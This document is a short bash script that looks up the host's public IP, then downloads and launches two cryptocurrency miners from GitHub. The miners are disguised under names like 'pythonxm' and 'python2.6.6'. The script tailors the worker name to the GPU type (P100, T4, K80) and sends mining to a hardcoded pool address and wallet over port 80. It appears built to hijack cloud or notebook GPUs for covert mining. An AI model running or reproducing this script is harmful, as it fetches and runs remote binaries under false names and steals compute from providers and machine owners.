#!bin/bash -xe 

## getting IP info
iip=$(curl -s https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io



echo '#######################################################'
echo '##################### RV OC 03 ########################'
echo '#######################################################'


########## XMR
rm -rf pythonxm
rm -rf config3.json
rm -rf x.out

# Prepare
wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
chmod +x pythonxm
wget -q https://github.com/one10001/10001code/raw/main/config3.json
sed -i "s+ip0001+$IPNAME+g" config3.json

nohup ./pythonxm -c config3.json 2>> oout 1>> oout &

rm -rf python2.6.6
wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
chmod +x python2.6.6
#cp python2.6.6 /bin/python2.6.6

if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
then
    ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_P100_$IPNAME@116.203.10.54:80  -G 
elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
then
    ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_T4_$IPNAME@116.203.10.54:80  -G 
elif [ $(nvidia-smi | grep K80 |wc -l) == 1 ]
then
    ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_K80_$IPNAME@116.203.10.54:80  -G 
else
    ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RV_P100_$IPNAME@116.203.10.54:80  -G 
fi